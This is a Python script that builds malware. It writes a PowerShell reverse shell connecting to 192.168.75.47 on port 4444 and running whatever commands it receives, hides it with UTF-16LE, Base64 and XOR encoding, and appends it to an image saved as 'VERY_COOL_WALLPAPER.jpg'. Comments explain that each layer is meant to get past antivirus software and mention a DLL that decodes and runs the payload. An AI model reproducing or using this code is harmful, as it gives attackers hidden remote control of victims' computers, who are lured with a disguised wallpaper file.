import base64

# The payload: The PowerShell script that will be executed on the victim's machine
payload = "$c=New-Object System.Net.Sockets.TCPClient('192.168.75.47',4444);$s=$c.GetStream();$sl=New-Object System.IO.StreamReader($s);$sw=New-Object System.IO.StreamWriter($s);$sw.AutoFlush=$true;while($c.Connected){$sw.Write('PS ' + (Get-Location).Path + '> ');$sw.Flush();$d=$sl.ReadLine();if($d -eq 'exit'){$c.Close();break};$out=(iex $d 2>&1 | Out-String);$sw.WriteLine($out);$sw.Flush()}"
key = 0x35 # Encryption key

unicode_script = payload.encode('utf-16-le')
"""
Why utf-16-le (Unicode Transformation Format - 16bits (2 bytes) - Little Endian)?
This ensures that Python script can talk directly to PowerShell. Unfortunately, Powershell
uses this type of encoding which is different than the standard UTF-8 encoding in Python. For 
that reason, the payload needs to be encoded first to UTF-16LE and then 'unicode_script' is
processed in the following code.
"""

b64_payload = base64.b64encode(unicode_script).decode() # BASE 64 ENCODING
"""
BASE64: Binary-to-Text Encoding Scheme: (Easy to be identified by AntiViruses)
It takes a raw binary data (bytes format) and converts them into a string of 64
printable characters (A-Z, a-z, 0-9, +, and /). It takes 3 bytes and splits them into four
chunks of 6 bits each. Each 6-bit chunk is mapped to one of the 64 characters above.
"""

xor_generated_message = "".join([chr(ord(c) ^ key) for c in b64_payload])
"""
XOR Layer: (The Layer that the AntiVirus Does NOT Understands)
After BASE64 encoding, the encryption happens with XOR layer. The hexadecimal key above
is used to be XORed with the 'b64_payload' variable to be converted into a file that no one
understands unless decrypted by the function located in the Dynamic Linked Library, which also 
passes (as BASE64) to PowerShell do decode again and then executes.

The reason of all these steps so the AntiVirus does not understands what is going on, and only
thinks this is a decoded conversation between two dumb software
"""

with open ("background.jpg",'rb') as image:
    image_data = image.read() #OBTAINING THE IMAGE

marker_start = b"START_HERE"  #START MARK
marker_end = b"END_HERE"      #END MARK

#REWRITING, THEN SAVING IN A NEW WALLPAPER
with open ("VERY_COOL_WALLPAPER.jpg","wb") as infected_image:
    infected_image.write(image_data)

    infected_image.write(marker_start + xor_generated_message.encode('latin-1') + marker_end)

print("Successfully Done")